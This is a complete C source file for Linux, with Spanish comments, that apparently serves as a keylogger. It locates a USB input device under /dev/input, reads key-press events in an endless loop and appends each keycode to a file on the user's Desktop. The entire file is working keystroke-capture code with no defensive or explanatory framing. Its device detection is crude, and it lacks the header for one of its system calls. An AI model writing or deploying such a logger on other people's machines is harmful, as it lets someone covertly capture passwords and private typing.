#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <dirent.h>

#define HOME_DIR getenv("HOME")
#define LOG_FILE "/Desktop/keylogging.txt"
#define INPUT_DIR "/dev/input/"

void log_key(int code) {
    char log_path[256];
    snprintf(log_path, sizeof(log_path), "%s%s", HOME_DIR, LOG_FILE);

    FILE *file = fopen(log_path, "a");
    if (file == NULL) {
        perror("No se pudo abrir el archivo de registro");
        exit(EXIT_FAILURE);
    }

    fprintf(file, "Keycode: %d\n", code);
    fclose(file);
}

char* find_keyboard_device() {
    struct dirent *entry;
    DIR *dp = opendir(INPUT_DIR);
    if (dp == NULL) {
        perror("No se pudo abrir el directorio de dispositivos de entrada");
        exit(EXIT_FAILURE);
    }

    char device_path[256];
    static char keyboard_device[256];

    while ((entry = readdir(dp))) {
        if (strncmp(entry->d_name, "event", 5) == 0) {
            snprintf(device_path, sizeof(device_path), "%s%s", INPUT_DIR, entry->d_name);

            int fd = open(device_path, O_RDONLY);
            if (fd == -1) continue;

            struct input_id device_info;
            ioctl(fd, EVIOCGID, &device_info);
            close(fd);

            // Filtrar por ID de fabricante y producto (puede variar según el teclado)
            // Aquí, se asume que el ID de producto y fabricante corresponde a un teclado genérico.
            if (device_info.bustype == BUS_USB) {  // Verificar si el dispositivo es USB
                strcpy(keyboard_device, device_path);
                closedir(dp);
                return keyboard_device;
            }
        }
    }

    closedir(dp);
    return NULL;
}

int main() {
    char *device = find_keyboard_device();
    if (device == NULL) {
        fprintf(stderr, "No se encontró un dispositivo de teclado.\n");
        return EXIT_FAILURE;
    }

    printf("Dispositivo de teclado encontrado: %s\n", device);

    struct input_event ev;
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        perror("No se pudo abrir el dispositivo de entrada");
        return EXIT_FAILURE;
    }

    while (1) {
        if (read(fd, &ev, sizeof(struct input_event)) < 0) {
            perror("Error al leer el evento de entrada");
            close(fd);
            return EXIT_FAILURE;
        }

        if (ev.type == EV_KEY && ev.value == 1) {
            log_key(ev.code);
        }
    }

    close(fd);
    return EXIT_SUCCESS;
}

